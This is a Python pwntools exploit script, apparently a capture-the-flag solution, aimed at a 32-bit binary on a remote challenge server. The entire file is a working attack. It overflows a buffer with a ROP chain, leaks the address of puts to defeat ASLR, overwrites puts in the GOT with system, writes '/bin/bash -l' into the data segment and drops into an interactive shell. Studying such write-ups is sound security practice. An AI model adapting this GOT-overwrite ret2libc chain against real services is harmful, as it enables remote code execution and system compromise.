#!/usr/bin/env python
from pwn import *

cin_this    =  0x0804a040
stdout_got  =  0x0804a0e0
setbuf_got  =  0x0804a00c
printf_got  =  0x0804a024
cin_got     =  0x0804a028
puts_got    =  0x0804a02c
strcmp_got  =  0x0804a030

setbuf_plt  =  0x08048570
printf_plt  =  0x080485d0
cin_plt     =  0x080485e0
puts_plt    =  0x080485f0
strcmp_plt  =  0x08048600

crossstream =  0x080487db
exit = 0xf7cfb6a0


deadbeef=0xefbeadde
bss = 0x0804a040
glibcstring = 0x8049451
data_seg = 0x0804a000 
main_exit=0x08048899
# system = 0xf7d07e10
# shbin  = 0xf7e3e055



old_ebp=0xffffd578

esp12_leaveret=0x8048556
leaveret=0x080487d8
pop3ret=0x804895d
popret = 0x804895e
pop1ret = 0x8048559         # pop ebx; ret
pop2ret = 0x80487d8
pop4ret = 0x804895c
ret = 0x8048542

# Offsets from puts
system_off  = -162000
execve_off  = 339968
shbin_off   = 1108341

# Garbage
payload  ="A"*24

# Stage 1 - leak
payload +=p32(puts_plt)     # We want to leak puts
payload +=p32(pop1ret)      # pop ebx; ret
payload +=p32(puts_got)     # puts@got

# Stage 2 - Overwrite puts got with system
payload +=p32(cin_plt)      # Read data
payload +=p32(pop2ret)      # Skip over trash
payload +=p32(cin_this)     # "this" pointer for cin
payload +=p32(puts_got)     # Write data here

# Stage 3 - Load "/bin/sh" in data segment
payload +=p32(cin_plt)      # Read data
payload +=p32(pop2ret)      # Skip over trash
payload +=p32(cin_this)     # "this" pointer for cin
payload +=p32(data_seg)     # Write data here

# Stage 3 - Call system
payload +=p32(puts_plt)     # Now system
payload +=p32(pop1ret)      # pop ebx; ret
payload +=p32(data_seg)     # /bin/sh
payload +=p32(deadbeef)     # Crash
write('pwn.bin', payload+'\n')
# sys.exit(0)

# Exploit
p = remote('challenges.mongo.sexy', 1040)
# p = process('./test.tsk')
p.clean_and_log()
p.sendline(payload)

puts_address=u32(p.recvn(4))
print "puts is at", hex(puts_address)
p.clean_and_log()

system = puts_address + system_off
print "system should be at", hex(system)
p.sendline(p32(system))

shbin = puts_address + shbin_off
print "/bin/sh should be at", hex(shbin)
# p.sendline(p32(shbin))
p.sendline("/bin/bash -l")

p.interactive()
# msg=p.recvline()
# print "msg: ", msg
p.clean_and_log()
p.close()
